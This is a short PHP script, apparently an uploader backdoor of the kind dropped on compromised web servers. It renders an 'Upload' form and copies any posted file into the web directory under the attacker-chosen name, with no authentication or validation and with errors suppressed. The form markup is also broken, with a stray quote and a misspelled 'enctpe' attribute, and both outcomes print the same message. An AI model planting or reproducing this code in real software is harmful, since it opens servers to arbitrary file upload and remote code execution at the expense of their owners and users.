<?php
    echo 'Upload<br>';
    echo '<br>';
    echo '<form action="" method=post" enctpe="multipart/form-data" name="uploader" id="uploader">';
    echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
    if($_POST['_upl'] == "Upload"){
        if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){
            echo '<b>Upload!! </b><br><br>';
        }
        else{
            echo '<br>Upload!!! </b><br><br>';
        }
    }
?>